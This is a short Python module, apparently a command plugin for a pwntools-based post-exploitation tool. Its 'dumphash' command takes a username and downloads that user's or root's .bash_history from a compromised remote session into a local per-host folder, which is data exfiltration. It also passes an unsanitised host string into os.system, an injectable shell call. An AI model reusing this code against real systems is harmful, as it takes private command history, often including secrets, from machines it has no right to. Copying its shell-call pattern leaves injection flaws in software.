#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

waitforcapture = 1

def execute(session, configs, params):
    
    if params == None:
        print(cs.status, "Usage: dumphash [user]")
        return 1
    elif params == "root":
        params = "/root/"
    else:
        params = "/home/" + params + "/"

    download_dir = configs["DownloadDirectory"] + session.host + "/"
    os.system("mkdir -p " + download_dir)
    session.download_file(params + ".bash_history", download_dir + "bash_history")
    return 0
